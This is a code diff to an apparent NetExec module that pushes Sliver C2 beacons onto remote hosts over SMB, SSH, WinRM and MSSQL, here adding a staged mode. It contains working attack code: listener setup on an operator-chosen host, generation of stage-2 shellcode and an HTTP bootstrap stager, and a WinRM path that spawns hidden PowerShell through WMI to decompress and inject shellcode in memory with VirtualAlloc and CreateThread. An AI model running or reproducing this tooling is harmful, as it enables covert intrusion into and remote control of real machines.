@@ -9,14 +9,36 @@ import threading
 import queue
 import logging
 import base64
+import gzip
+import textwrap
 from abc import ABC, abstractmethod
 from nxc.helpers.misc import CATEGORY
 
-try:
-    from sliver import SliverClientConfig, SliverClient
-    from sliver.pb.clientpb import client_pb2 as clientpb
-except ImportError:
-    raise ImportError("sliver-py not installed. Hint: pipx inject netexec sliver-py")
+# Use local sliver protobuf bindings
+_module_dir = os.path.dirname(os.path.abspath(__file__))
+_src_dir = os.path.join(_module_dir, 'src')
+if _src_dir not in sys.path:
+    sys.path.insert(0, _src_dir)
+
+def _import_protobuf():
+    global SliverClientConfig, SliverClient, grpc, clientpb, rpcpb, rpc_grpc
+    if 'SliverClientConfig' not in globals() or SliverClientConfig is None:
+        try:
+            from sliver import SliverClientConfig, SliverClient
+            import grpc
+            from sliver.pb.clientpb import client_pb2 as clientpb
+            from sliver.pb.rpcpb import services_pb2 as rpcpb
+            from sliver.pb.rpcpb import services_pb2_grpc as rpc_grpc
+        except ImportError:
+            raise ImportError("Sliver protobuf bindings not available. This module should be installed with its packaged protobuf bindings.")
+
+# Initialize globals to None for lazy loading
+SliverClientConfig = None
+SliverClient = None
+grpc = None
+clientpb = None
+rpcpb = None
+rpc_grpc = None
 
 
 class GrpcWorker:
@@ -66,17 +88,23 @@ class GrpcWorker:
 
     async def _do_connect(self, config_path):
         """Connect to Sliver server."""
+        _import_protobuf()
+        if config_path is None:
+            raise ValueError("Sliver config_path cannot be None. Ensure a valid path is set in module config.")
         if self.client is None or self.config_path != config_path:
             cfg = SliverClientConfig.parse_config_file(config_path)
             if not all([cfg.ca_certificate, cfg.certificate, cfg.private_key]):
                 raise ValueError("Sliver config missing certificates")
-
-            self.client = SliverClient(cfg)
+            
             self.config_path = config_path
+            self.client = SliverClient(cfg)
+            
 
         if not self.connected:
             await self.client.connect()
             self.connected = True
+            # Patch client for raw staging RPCs
+            self.client.raw_stub = self.client._stub
 
         return self.client
 
@@ -89,6 +117,17 @@ class GrpcWorker:
         """Start mTLS listener."""
         client = await self._do_connect(self.config_path)
         await client.start_mtls_listener(host, port)
+
+    async def _do_start_tcp_stager_listener(self, host, port):
+        """Start TCP stager listener (HTTP/TCP for staging)."""
+        client = await self._do_connect(self.config_path)
+        _import_protobuf()
+        req = clientpb.StagerListenerReq()
+        req.Host = host
+        req.Port = port
+        # Raw RPC call
+        resp = await client.raw_stub.StartTCPStagerListener(req, timeout=30)
+        return resp
 
     async def _do_implant_profiles(self):
         """Get list of implant profiles."""
@@ -107,6 +146,49 @@ class GrpcWorker:
         resp = await client.generate_implant(ic)
         if not resp.File or not resp.File.Data:
             raise ValueError(f"Failed to generate implant: {resp.Err or 'unknown'}")
+        return resp
+    
+    async def _do_generate_stage(self, req):  # Change: Accept full req object
+        """Generate stager payload from full GenerateStageReq."""
+        client = await self._do_connect(self.config_path)
+        resp = await client.raw_stub.GenerateStage(req, timeout=30)
+        if not resp.File or not resp.File.Data:
+            raise ValueError(f"Failed to generate stage: {resp.Err or 'unknown'}")
+        return resp
+    
+    async def _do_stage_implant_build(self, req):  # Change: Accept full req for repeated Build
+        """Stage implant builds for serving via listener."""
+        client = await self._do_connect(self.config_path)
+        resp = await client.raw_stub.StageImplantBuild(req, timeout=30)
+        return resp
+    
+    async def _do_start_stager_listener(self, host, port, protocol):
+        """Start stager listener (HTTP or TCP based on protocol)."""
+        client = await self._do_connect(self.config_path)
+        _import_protobuf()
+        req = clientpb.StagerListenerReq()
+        req.Host = host
+        req.Port = port
+        # Set enum (StageProtocol: TCP=0, HTTP=1, HTTPS=2)
+        if protocol == "tcp":
+            req.Protocol = clientpb.StageProtocol.TCP
+            resp = await client.raw_stub.StartTCPStagerListener(req, timeout=30)
+        elif protocol == "http":
+            req.Protocol = clientpb.StageProtocol.HTTP
+            resp = await client.raw_stub.StartHTTPStagerListener(req, timeout=30)
+        else:
+            raise ValueError(f"Unsupported STAGER_PROTOCOL: {protocol} (use 'http' or 'tcp')")
+        return resp
+
+    async def _do_generate_shellcode(self, ic):
+        """Generate shellcode directly using Generate RPC."""
+        client = await self._do_connect(self.config_path)
+        _import_protobuf()
+        req = clientpb.GenerateReq(Config=ic)
+        # Raw RPC call
+        resp = await client._stub.Generate(req, timeout=30)
+        if not resp.File or not resp.File.Data:
+            raise ValueError(f"Failed to generate shellcode: {resp.Err or 'unknown'}")
         return resp
 
     async def _do_beacons(self):
@@ -215,6 +297,11 @@ try {{
         pass
 
     @abstractmethod
+    def stage_execute(self, context, connection, os_type, stager_data):
+        """Execute the stager shellcode/data. Log success/warn. Raise if unsupported."""
+        pass
+
+    @abstractmethod
     def get_cleanup_cmd(self, full_remote_path, os_type):
         """Return shell cmd str to delete the file (e.g., 'del /f ...')."""
         pass
@@ -254,7 +341,7 @@ class SMBHandler(ProtocolHandler):
         connection.conn.putFile(share, smb_path, open(local_path, "rb").read)
         context.log.success("SMB upload complete")
 
-    def execute(self, context, connection, full_remote_path, os_type):
+    def execute(self, context, connection, full_remote_path, os_type, **kwargs):
         method = "smbexec"
         if os_type == "windows":
             cmd = f'cmd /c "{full_remote_path}"'
@@ -265,6 +352,10 @@ class SMBHandler(ProtocolHandler):
             context.log.info(f"Executed via SMB: {full_remote_path}")
         except Exception as e:
             context.log.warning(f"SMB exec failed: {e}")
+
+    def stage_execute(self, context, connection, os_type, stager_data):
+        context.log.fail("Staging not supported on SMB")
+        raise NotImplementedError("SMB staging requires uploaded stager exe; not yet implemented")
 
     def get_cleanup_cmd(self, full_remote_path, os_type):
         return f'del /f /q "{full_remote_path}"' if os_type == "windows" else f'rm -f "{full_remote_path}"'
@@ -287,13 +378,17 @@ class SSHHandler(ProtocolHandler):
             context.log.fail(f"SSH upload failed: {e}")
             raise
 
-    def execute(self, context, connection, full_remote_path, os_type):
+    def execute(self, context, connection, full_remote_path, os_type, **kwargs):
         cmd = f"nohup {full_remote_path} >/dev/null 2>&1 &"
         try:
             connection.execute(cmd)
             context.log.info(f"Executed via SSH: {full_remote_path}")
         except Exception as e:
             context.log.warning(f"SSH exec failed: {e}")
+
+    def stage_execute(self, context, connection, os_type, stager_data):
+        context.log.fail("Staging not supported on SSH")
+        raise NotImplementedError("SSH staging requires uploaded stager shellcode; not yet implemented")
 
     def get_cleanup_cmd(self, full_remote_path, os_type):
         return f"rm -f '{full_remote_path}'"
@@ -306,6 +401,10 @@ class WinRMHandler(ProtocolHandler):
         return f"C:\\Windows\\Temp\\{implant_name}", None
 
     def upload(self, context, connection, local_path, full_remote_path):
+        # For staging, skip upload (stager is executed directly)
+        if local_path is None and full_remote_path is None:
+            return
+
         def exec_ps_cmd(ps_cmd):
             return connection.ps_execute(ps_cmd, get_output=True)
 
@@ -317,7 +416,11 @@ class WinRMHandler(ProtocolHandler):
             context.log.fail(f"WinRM upload failed: {e}")
             raise
 
-    def execute(self, context, connection, full_remote_path, os_type):
+    def execute(self, context, connection, full_remote_path, os_type, **kwargs):
+        # Handle staging mode
+        if 'stager_data' in kwargs:
+            return self.stage_execute(context, connection, os_type, kwargs['stager_data'])
+
         ps_cmd = f'(Get-WmiObject -Class Win32_Process -List).Create("{full_remote_path}") | Out-Null'
         try:
             result = connection.ps_execute(ps_cmd, get_output=True)
@@ -326,6 +429,47 @@ class WinRMHandler(ProtocolHandler):
             context.log.info(f"Executed via WinRM: {full_remote_path}")
         except Exception as e:
             context.log.warning(f"WinRM exec failed: {e}")
+
+    def _generate_encoded_loader(self, b64_stager):  # Remove http_url; no download in PS
+        """Minimal PS loader: Decompress and inject raw bootstrap shellcode."""
+        loader_ps = textwrap.dedent(f'''
+            $compressed = [Convert]::FromBase64String('{b64_stager}');
+            $ms = [System.IO.MemoryStream]::new();
+            $gzip = [System.IO.Compression.GZipStream]::new([System.IO.MemoryStream]::new($compressed), [System.IO.Compression.CompressionMode]::Decompress);
+            $gzip.CopyTo($ms);
+            $gzip.Close();
+            $code = $ms.ToArray();
+            Add-Type -TypeDefinition @"
+            using System; using System.Runtime.InteropServices;
+            public class Mem {{ [DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p);
+            [DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr a, uint s, IntPtr start, IntPtr p, uint c, IntPtr id); }}
+            "@
+            $addr = [Mem]::VirtualAlloc(0, $code.Length, (0x1000 -bor 0x2000), 0x40);
+            [System.Runtime.InteropServices.Marshal]::Copy($code, 0, $addr, $code.Length);
+            [Mem]::CreateThread(0, 0, $addr, 0, 0, 0) | Out-Null;
+        ''')
+        return base64.b64encode(loader_ps.encode('utf-16-le')).decode('ascii')
+
+    def stage_execute(self, context, connection, os_type, stager_data):
+        # No listener start here—done in _run_beacon
+        compressed = gzip.compress(stager_data)  # Compress tiny bootstrap
+        b64_stager = base64.b64encode(compressed).decode('ascii')
+        encoded_loader = self._generate_encoded_loader(b64_stager)
+        
+        total_size = len(encoded_loader)
+        if total_size > 150 * 1024:
+            context.log.warning(f"Encoded loader size ({total_size} bytes) may exceed WinRM envelope")
+
+        wmi_cmd = f'''(Get-WmiObject -Class Win32_Process -List).Create('powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand {encoded_loader}') | Out-Null'''
+        try:
+            result = connection.ps_execute(wmi_cmd, get_output=True)
+            if result and result.strip():
+                context.log.debug(f"WMI spawn output: {result}")
+            context.log.info("Bootstrap stager injected via detached in-memory WMI (HTTP fetch self-handled)")
+            return True
+        except Exception as e:
+            context.log.fail(f"WinRM stager exec failed: {e}")
+            return False
 
     def get_cleanup_cmd(self, full_remote_path, os_type):
         return f"Remove-Item -Force '{full_remote_path}'"
@@ -389,7 +533,7 @@ class MSSQLHandler(ProtocolHandler):
                 set_option('xp_cmdshell', 0)
             context.log.debug("Restored original option states")
 
-    def execute(self, context, connection, full_remote_path, os_type):
+    def execute(self, context, connection, full_remote_path, os_type, **kwargs):
         import base64
         wmi_ps = f'(Get-WmiObject -Class Win32_Process -List).Create("{full_remote_path}") | Out-Null'
         encoded_script = base64.b64encode(wmi_ps.encode('utf-16-le')).decode('ascii')
@@ -399,6 +543,10 @@ class MSSQLHandler(ProtocolHandler):
             context.log.info(f"Executed via MSSQL (WMI): {full_remote_path}")
         except Exception as e:
             context.log.warning(f"MSSQL exec failed: {e}")
+
+    def stage_execute(self, context, connection, os_type, stager_data):
+        context.log.fail("Staging not supported on MSSQL")
+        raise NotImplementedError("MSSQL staging requires xp_cmdshell shellcode exec; not yet implemented")
 
     def get_cleanup_cmd(self, full_remote_path, os_type):
         return f"del /f /q \"{full_remote_path}\""
@@ -456,6 +604,10 @@ class NXCModule:
         self.rhost = None
         self.rport = None
         self.cleanup = True
+        self.staging = False
+        self.stager_rhost = None
+        self.stager_rport = None
+        self.stager_protocol = "http"
         self.os_type = None
         self.arch = None
         self.share_config = None
@@ -463,6 +615,7 @@ class NXCModule:
         self.profile = None
         # Runtime state
         self.local_implant_path = None
+        self.stager_data = None
 
     def options(self, context, module_options):
         """
@@ -481,7 +634,8 @@ class NXCModule:
         # Known options
         known_options = {
             "IMPLANT_BASE_PATH", "RHOST", "RPORT", "CLEANUP", "OS", "ARCH",
-            "SHARE", "PROFILE", "WAIT", "FORMAT"
+            "SHARE", "PROFILE", "WAIT", "FORMAT", "STAGING", "STAGER_RHOST", 
+            "STAGER_RPORT", "STAGER_PROTOCOL"
         }
 
         # Check for unknown options
@@ -526,6 +680,33 @@ class NXCModule:
                 context.log.fail("PROFILE cannot be empty")
                 sys.exit(1)
 
+        # For staging, validate stager options if provided
+        staging_enabled = module_options.get("STAGING", "False").lower() in ("true", "1", "yes")
+        if staging_enabled:
+            stager_protocol = module_options.get("STAGER_PROTOCOL", "http").lower()
+            if stager_protocol not in ["http", "tcp"]:
+                context.log.fail("STAGER_PROTOCOL must be 'http' or 'tcp' (default: http)")
+                sys.exit(1)
+
+            # Validate STAGER_RHOST if provided
+            if module_options.get("STAGER_RHOST"):
+                import ipaddress
+                try:
+                    ipaddress.IPv4Address(module_options["STAGER_RHOST"])
+                except ipaddress.AddressValueError:
+                    context.log.fail(f"STAGER_RHOST must be a valid IPv4 address: {module_options['STAGER_RHOST']}")
+                    sys.exit(1)
+
+            # Validate STAGER_RPORT if provided
+            if module_options.get("STAGER_RPORT"):
+                try:
+                    port = int(module_options["STAGER_RPORT"])
+                    if not (1 <= port <= 65535):
+                        raise ValueError()
+                except (ValueError, TypeError):
+                    context.log.fail(f"STAGER_RPORT must be a valid port number (1-65535): {module_options['STAGER_RPORT']}")
+                    sys.exit(1)
+
     def _parse_module_options(self, context, module_options):
         """
         Parse all module options and set instance variables.
@@ -537,6 +718,7 @@ class NXCModule:
         self.rhost = module_options.get("RHOST", None)
         self.rport = int(module_options["RPORT"]) if "RPORT" in module_options and module_options.get("RPORT") is not None else None
         self.cleanup = module_options.get("CLEANUP", "True").lower() in ("true", "1", "yes")
+        self.staging = module_options.get("STAGING", "False").lower() in ("true", "1", "yes")
         self.os_type = module_options.get("OS", None)
         self.arch = module_options.get("ARCH", None)
         self.share_config = module_options.get("SHARE", None)  # Optional, used by SMB
@@ -545,6 +727,12 @@ class NXCModule:
         self.profile = module_options.get("PROFILE", None)
         if self.profile:
             context.log.display(f"Using Sliver profile: {self.profile}")
+        if self.staging:
+            self.stager_rhost = module_options.get("STAGER_RHOST", None)
+            self.stager_rport = int(module_options["STAGER_RPORT"]) if "STAGER_RPORT" in module_options and module_options.get("STAGER_RPORT") is not None else None
+            self.stager_protocol = module_options.get("STAGER_PROTOCOL", "http").lower()
+            context.log.display(f"Stager listener: {self.stager_rhost}:{self.stager_rport} ({self.stager_protocol})")
+            context.log.display(f"Final C2: {self.rhost}:{self.rport} (mTLS)")
         fmt = module_options.get("FORMAT", "exe").lower()
         if fmt not in ["exe", "executable"]:
             context.log.fail("Only EXECUTABLE format supported. Use: exe")
@@ -577,12 +765,13 @@ class NXCModule:
 
     def _worker_submit(self, method, *args, **kwargs):
         """Convenience wrapper to ensure worker is connected then submit a task."""
-        # The caller should ensure connection with `_get_worker_and_connect()` when needed.
+        _ = self._get_worker_and_connect()
         worker = self.__class__._get_shared_worker()
         return worker.submit_task(method, *args, **kwargs)
 
     def _get_listener_by_id(self, listener_id):
         """Return listener proto object by ID or None."""
+        _ = self._get_worker_and_connect()
         jobs = self._worker_submit('jobs')
         return next((j for j in jobs if getattr(j, 'ID', '') == listener_id), None)
 
@@ -618,24 +807,25 @@ class NXCModule:
         else:
             raise ValueError(f"Unsupported listener protocol: {proto}")
 
-    def _ensure_default_mtls_listener(self, context):
-        """Ensure a default mTLS listener is available on `self.rhost:self.rport`.
+    def _ensure_default_mtls_listener(self, context, mtls_port=None):
+        """Ensure a default mTLS listener is available on port.
         Returns the listener object (proto) if found/created, else raises ValueError.
         """
+        port = mtls_port or self.rport
         # First, check for an existing tcp listener with Name==mtls on the port
-        existing = self._find_listener(protocol="tcp", port=self.rport, name="mtls")
+        existing = self._find_listener(protocol="tcp", port=port, name="mtls")
         if not existing:
             try:
-                self._worker_submit('start_mtls_listener', self.rhost, self.rport)
-                context.log.info(f"Started default mTLS listener on {self.rhost}:{self.rport}")
+                self._worker_submit('start_mtls_listener', self.rhost, port)
+                context.log.info(f"Started default mTLS listener on {self.rhost}:{port}")
             except Exception as listener_e:
                 if "address already in use" in str(listener_e).lower():
-                    context.log.warning(f"mTLS port {self.rport} in use (non-Sliver process?); assuming usable or pre-started.")
+                    context.log.warning(f"mTLS port {port} in use (non-Sliver process?); assuming usable or pre-started.")
                 else:
                     raise listener_e
 
         # Re-fetch after creation to get ID (expect an active mTLS listener)
-        default_listener = self._find_listener(protocol="tcp", port=self.rport, name="mtls")
+        default_listener = self._find_listener(protocol="tcp", port=port, name="mtls")
         if not default_listener:
             raise ValueError("Failed to start default mTLS listener")
         return default_listener
@@ -682,37 +872,70 @@ class NXCModule:
         Core beacon execution logic.
         1. Detect OS/arch
         2. Generate unique implant name
-        3. Generate Sliver beacon
-        4. Upload to target via protocol handler
+        3. Generate Sliver beacon or stager
+        4. Upload to target via protocol handler (or skip for staging)
         5. Execute
         6. Wait & cleanup
         """
+        if self.config_path is None:
+            context.log.fail("Sliver config_path not set. Ensure options() is called before running the module.")
+            sys.exit(1)
+
         host = connection.host
         os_type, arch = self._detect_os_arch(context, connection)
         implant_name = self._generate_implant_name()
-        implant_data = self._generate_sliver_implant(context, os_type, arch, implant_name)
-        tmp_path = self._save_implant_to_temp(implant_data)
-        self.local_implant_path = tmp_path
 
         # Extract protocol from connection object's class name (e.g., 'winrm' -> 'winrm')
         protocol = connection.__class__.__name__.lower()
         handler = self.get_handler(protocol)
 
         try:
-            full_remote_path, share = handler.get_remote_paths(os_type, implant_name)
-            self.full_path = full_remote_path
-            if share:
-                self.share = share
-            context.log.display(f"Starting upload to {host} via {protocol}...")
-            handler.upload(context, connection, tmp_path, full_remote_path)
-            context.log.info(f"Uploaded to {host} via {protocol}")
-            context.log.display(f"Executing beacon at {full_remote_path}...")
-            handler.execute(context, connection, full_remote_path, os_type)
+            full_remote_path = None
+            if self.staging:
+                if protocol != "winrm":
+                    context.log.fail("Staging currently only supported on WinRM")
+                    sys.exit(1)
+                self.stage_port = self.rport  # Define if needed
+                # Ensure worker connected BEFORE any submits (fixes config_path=None in _do_connect)
+                _ = self._get_worker_and_connect()
+                # Start HTTP listener FIRST
+                self._worker_submit('start_stager_listener', self.stager_rhost or self.rhost, self.stager_rport or self.rport, self.stager_protocol)
+                context.log.info(f"Started {self.stager_protocol.upper()} stager listener on {self.stager_rhost or self.rhost}:{self.stager_rport or self.rport}")
+                # Now start mTLS listener for stage 2
+                self.mtls_port = self.rport  # Use RPORT for stage 2 mTLS
+                _ = self._get_worker_and_connect()  # Re-ensure for mTLS
+                self._worker_submit('start_mtls_listener', self.rhost, self.mtls_port)
+                context.log.info(f"Started mTLS C2 listener for stage 2 on {self.rhost}:{self.mtls_port}")
+                # Build profile for stage2 (defines profile_name; already has connect guard)
+                _, profile_name = self._build_ic_default(context, os_type, arch, implant_name) if not self.profile else self._build_ic_from_profile(context, os_type, arch, implant_name)
+                # Gen bootstrap + prep stage2
+                self.stager_data = self._generate_sliver_stager(context, os_type, arch, implant_name, profile_name)
+                success = handler.stage_execute(context, connection, os_type, self.stager_data)
+                if not success:
+                    context.log.fail("Stager execution failed")
+                    sys.exit(1)
+                context.log.info(f"Stager executed on {host} via {protocol} (multi-stage HTTP)")
+                full_remote_path = None  # In-memory; no cleanup needed
+            else:
+                ic = self._build_ic_from_profile(context, os_type, arch, implant_name)[0] if self.profile else self._build_ic_default(context, os_type, arch, implant_name)[0]
+                implant_data = self._generate_sliver_implant(context, os_type, arch, implant_name)
+                tmp_path = self._save_implant_to_temp(implant_data)
+                self.local_implant_path = tmp_path
+                full_remote_path, share = handler.get_remote_paths(os_type, implant_name)
+                self.full_path = full_remote_path
+                if share:
+                    self.share = share
+                context.log.display(f"Starting upload to {host} via {protocol}...")
+                handler.upload(context, connection, tmp_path, full_remote_path)
+                context.log.info(f"Uploaded to {host} via {protocol}")
+                context.log.display(f"Executing beacon at {full_remote_path}...")
+                handler.execute(context, connection, full_remote_path, os_type)
 
-            self._wait_for_beacon_and_cleanup(context, connection, full_remote_path, os_type, implant_name, handler, protocol, cleanup=self.cleanup)
+            self._wait_for_beacon_and_cleanup(context, connection, full_remote_path, os_type, implant_name, handler, protocol, cleanup=self.cleanup and not self.staging)
 
         finally:
-            self._cleanup_local_temp(tmp_path)
+            if not self.staging:
+                self._cleanup_local_temp(self.local_implant_path)
 
     def _detect_os_arch(self, context, connection):
         """
@@ -795,6 +1018,7 @@ class NXCModule:
         """
         Build ImplantConfig with current hardcoded defaults.
         """
+        _import_protobuf()
         ic = clientpb.ImplantConfig()
         ic.Name = implant_name
         ic.GOOS = os_type
@@ -815,6 +1039,7 @@ class NXCModule:
 
     def _build_ic_from_profile(self, context, os_type, arch, implant_name):
         """Validate and build ImplantConfig from an existing profile."""
+        _ = self._get_worker_and_connect()
         profiles = self._worker_submit('implant_profiles')
         profile_pb = next((p for p in profiles if getattr(p, 'Name', None) == self.profile), None)
         if not profile_pb:
@@ -826,6 +1051,7 @@ class NXCModule:
             context.log.fail("Profile incompatible with host")
             sys.exit(1)
 
+        _import_protobuf()
         ic_local = clientpb.ImplantConfig()
         ic_local.CopyFrom(profile_pb.Config)
         ic_local.Name = implant_name
@@ -834,11 +1060,12 @@ class NXCModule:
         ic_local.Format = clientpb.OutputFormat.Value(self.format)
 
         context.log.info(f"Generating from profile {self.profile}")
-        return ic_local
+        return ic_local, self.profile
 
     def _build_ic_default(self, context, os_type, arch, implant_name):
         """Build default ImplantConfig and attempt to reuse or save a profile."""
-        default_listener = self._ensure_default_mtls_listener(context)
+        _ = self._get_worker_and_connect()
+        default_listener = self._ensure_default_mtls_listener(context, getattr(self, 'mtls_port', None))
         c2_url = self._build_c2_url_from_listener(default_listener)
         ic_local = self._build_default_implant_config(os_type, arch, implant_name, c2_url)
         profiles = self._worker_submit('implant_profiles')
@@ -860,7 +1087,9 @@ class NXCModule:
         matching_profile = next((p for p in profiles if _matches(p)), None)
         if matching_profile:
             context.log.info(f"Reusing matching default profile: {matching_profile.Name}")
+            profile_name = matching_profile.Name
         else:
+            _import_protobuf()
             profile_name = f"nxc_default_{secrets.token_hex(4)}"
             profile_pb = clientpb.ImplantProfile()
             profile_pb.Name = profile_name
@@ -868,10 +1097,11 @@ class NXCModule:
             try:
                 saved_profile = self._worker_submit('save_implant_profile', profile_pb)
                 context.log.info(f"Created default profile: {saved_profile.Name}")
+                profile_name = saved_profile.Name
             except Exception as e:
                 context.log.warning(f"Failed to save default profile '{profile_name}': {e}")
 
-        return ic_local
+        return ic_local, profile_name
 
     def _get_listener_c2_url(self, listener):
         """
@@ -894,9 +1124,9 @@ class NXCModule:
             context.log.info("Connected to Sliver gRPC")
 
             if self.profile:
-                ic = self._build_ic_from_profile(context, os_type, arch, implant_name)
+                ic, _ = self._build_ic_from_profile(context, os_type, arch, implant_name)
             else:
-                ic = self._build_ic_default(context, os_type, arch, implant_name)
+                ic, _ = self._build_ic_default(context, os_type, arch, implant_name)
 
             # Generate implant
             context.log.display(f"Generating Sliver {os_type}/{arch} {self.format.lower()}...")
@@ -907,6 +1137,53 @@ class NXCModule:
         except Exception as e:
             context.log.fail(f"Failed to generate implant: {e}")
             sys.exit(1)
+
+    def _generate_sliver_stager(self, context, os_type, arch, implant_name, profile_name):
+        try:
+            _ = self._get_worker_and_connect()
+            context.log.info("Generating HTTP bootstrap stager...")
+            # Build Stage 2 IC with mTLS C2
+            ic_stage2 = self._build_default_implant_config(os_type, arch, implant_name, f"mtls://{self.rhost}:{self.rport}")
+            ic_stage2.Format = 1  # SHELLCODE
+            ic_stage2.Evasion = False
+            ic_stage2.ObfuscateSymbols = False
+            stage2_resp = self._worker_submit('generate_shellcode', ic_stage2)  # Gen stage2 shellcode
+            if not stage2_resp.File or not stage2_resp.File.Data:
+                raise ValueError("Stage 2 shellcode gen failed")
+
+            # Save stage2 as profile/build
+            _import_protobuf()
+            stage2_profile_name = f"nxc_stage2_{secrets.token_hex(4)}"
+            stage2_pb = clientpb.ImplantProfile()
+            stage2_pb.Name = stage2_profile_name
+            stage2_pb.Config.CopyFrom(ic_stage2)
+            saved_stage2 = self._worker_submit('save_implant_profile', stage2_pb)
+            build_id = saved_stage2.Name  # Use profile name as build ID
+
+            # Gen tiny Stage 1 bootstrap (msfvenom HTTP reverse)
+            req = clientpb.GenerateStageReq()
+            req.Build = build_id  # Stage 2 build
+            req.Lhost = self.stager_rhost
+            req.Lport = self.stager_rport
+            req.OS = os_type.upper()
+            req.Arch = arch.upper()
+            req.Format = "raw"  # Raw shellcode
+            req.Protocol = "http"  # HTTP bootstrap
+            resp = self._worker_submit('generate_stage', req)  # Now passes full req
+            if not resp.File or not resp.File.Data:
+                raise ValueError("Bootstrap stager gen failed")
+            
+            context.log.info(f"Bootstrap stager generated ({len(resp.File.Data)} bytes)")
+
+            # Register stage2 on listener (after start in _run_beacon)
+            stage_req = clientpb.ImplantStageReq()
+            stage_req.Build.append(build_id)
+            self._worker_submit('stage_implant_build', stage_req)  # Pass full req
+            
+            return resp.File.Data  # Tiny bootstrap only
+        except Exception as e:
+            context.log.fail(f"Stager gen failed: {e}")
+            raise
 
     def _save_implant_to_temp(self, implant_data):
         """
@@ -930,7 +1207,7 @@ class NXCModule:
             else:
                 context.log.display("Beacon not detected within timeout")
 
-        if cleanup:
+        if cleanup and full_remote_path:  # Skip if staging (no file)
             # Cleanup remote file
             cleanup_cmd = handler.get_cleanup_cmd(full_remote_path, os_type)
             method = self._get_exec_method(protocol)
@@ -944,8 +1221,8 @@ class NXCModule:
                 context.log.info("Cleaned up remote implant")
             except Exception as e:
                 context.log.warning(f"Cleanup failed: {e}")
-        else:
-            context.log.info("Cleanup skipped (CLEANUP=False)")
+        elif cleanup:
+            context.log.info("Cleanup skipped (staging: in-memory)")
 
     def _wait_for_beacon(self, context, implant_name, timeout=30):
         """
